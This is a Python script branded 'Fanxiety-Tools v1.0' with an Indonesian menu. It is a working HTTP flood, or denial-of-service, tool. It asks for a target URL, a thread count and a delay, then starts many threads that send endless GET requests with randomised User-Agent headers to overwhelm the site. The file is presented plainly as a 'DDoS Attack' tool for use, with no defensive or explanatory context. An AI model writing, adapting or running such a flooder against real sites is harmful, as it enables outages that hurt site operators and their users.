import threading
import requests
import time
import random
from colorama import Fore, Style, init

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def attack(target_url, delay):
    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(target_url, headers=headers)
            print(f"{Fore.GREEN}[✓] {Fore.WHITE}Request sent! {Fore.CYAN}Status: {Fore.YELLOW}{response.status_code}")
        except Exception as e:
            print(f"{Fore.RED}[✗] {Fore.WHITE}Error: {Fore.YELLOW}{e}")
        time.sleep(delay)

def print_banner():
    print(f"""{Fore.RED}
███████╗ █████╗ ███╗   ██╗██╗  ██╗██╗███████╗████████╗██╗   ██╗
██╔════╝██╔══██╗████╗  ██║╚██╗██╔╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
█████╗  ███████║██╔██╗ ██║ ╚███╔╝ ██║█████╗     ██║    ╚████╔╝ 
██╔══╝  ██╔══██║██║╚██╗██║ ██╔██╗ ██║██╔══╝     ██║     ╚██╔╝  
██║     ██║  ██║██║ ╚████║██╔╝ ██╗██║███████╗   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝      ╚═╝   
    {Fore.BLUE}Fanxiety-Tools v1.0{Style.RESET_ALL}
    """)

def print_menu():
    print(f"{Fore.YELLOW}╔{'═'*50}╗")
    print(f"║{Fore.CYAN}{'MENU UTAMA':^50}{Fore.YELLOW}║")
    print(f"╠{'═'*50}╣")
    print(f"║ {Fore.GREEN}1.{Fore.WHITE} DDoS Attack{' '*35}{Fore.YELLOW}║")
    print(f"║ {Fore.GREEN}2.{Fore.WHITE} Exit{' '*42}{Fore.YELLOW}║")
    print(f"╚{'═'*50}╝")

def fanxiety_tool():
    print_banner()
    print_menu()
    
    choice = input(f"\n{Fore.YELLOW}[?]{Fore.WHITE} Pilih opsi: ")
    
    if choice == "1":
        print(f"\n{Fore.BLUE}╔{'═'*50}╗")
        print(f"║{Fore.RED}{'KONFIGURASI SERANGAN':^50}{Fore.BLUE}║")
        print(f"╠{'═'*50}╣")
        
        thread_count = int(input(f"{Fore.BLUE}║ {Fore.WHITE}Jumlah Thread (contoh: 100): "))
        target_url = input(f"{Fore.BLUE}║ {Fore.WHITE}URL Target: ")
        delay = float(input(f"{Fore.BLUE}║ {Fore.WHITE}Delay (detik): "))
        print(f"╚{'═'*50}╝")
        
        print(f"\n{Fore.MAGENTA}[!] {Fore.WHITE}Memulai serangan ke {Fore.CYAN}{target_url}")
        print(f"{Fore.MAGENTA}[!] {Fore.WHITE}Tekan {Fore.RED}CTRL+C {Fore.WHITE}untuk menghentikan\n")
        
        for _ in range(thread_count):
            thread = threading.Thread(target=attack, args=(target_url, delay))
            thread.daemon = True
            thread.start()
        
        while True:
            time.sleep(1)
    
    elif choice == "2":
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Keluar dari program...")
        exit()
    
    else:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Opsi tidak valid!")

if __name__ == "__main__":
    try:
        fanxiety_tool()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Serangan dihentikan!")
        exit()
